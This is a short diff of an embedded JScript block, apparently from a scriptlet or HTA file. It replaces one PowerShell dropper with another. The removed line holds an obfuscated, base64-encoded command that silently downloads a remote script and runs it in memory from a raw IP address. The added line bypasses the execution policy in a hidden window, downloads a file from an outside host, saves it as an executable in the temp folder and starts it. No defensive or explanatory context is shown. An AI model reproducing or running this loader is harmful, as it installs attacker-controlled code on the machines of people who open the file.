@@ -13,8 +13,7 @@
 <script language="JScript">
 <![CDATA[
 
-	var r = new ActiveXObject("WScript.Shell").Run("powershell /w 1 /C \"s\'\'v mm -;s\'\'v Dp e\'\'c;s\'\'v DTs ((g\'\'v mm).value.toString()+(g\'\'v Dp).value.toString());powershell (g\'\'v DTs).value.toString() (\'cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANAAwAC4AOAAyAC4AMQA4AC4AMgAwADkAOgAxADEAMgA0ADAALwBpAG4AZABlAHgALgBoAHQAbQBsACcAKQApACIACgA\'+\'=\')\"", 0, true);
-
+	var r = new ActiveXObject("WScript.Shell").Run("powershell -ExecutionPolicy Bypass -nop -w hidden -c (new-object System.Net.WebClient).DownloadFile(\'http://daili.agx88.com/image/InVan.jpg\',\'%temp%\\InVan.exe\');start-process \'%temp%\\InVan.exe\';", 0, true);
 ]]>
 </script>
 
